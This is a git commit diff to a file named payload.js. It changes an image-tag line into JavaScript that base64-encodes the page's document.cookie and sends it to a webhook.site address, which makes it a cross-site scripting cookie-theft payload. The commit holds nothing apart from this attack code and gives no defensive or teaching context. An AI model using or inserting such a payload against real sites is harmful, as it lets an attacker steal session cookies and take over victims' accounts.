60bd1270abdbfe23b11ef8dbb8aca53a812948aa
Chinh Do <89497629+Chid0k@users.noreply.github.com>
2025-08-03 17:55:33 +0700

    payload.js

--- payload.js
+++ payload.js
@@ -1,2 +1,2 @@
 // https://cdn.jsdelivr.net
-<img src="a" onerror="https://webhook.site/d81f39b8-ab0d-4f78-b5a2-591415dd5155">
+x = new Image(); x.src = 'https://webhook.site/d81f39b8-ab0d-4f78-b5a2-591415dd5155?data='+btoa(document.cookie);
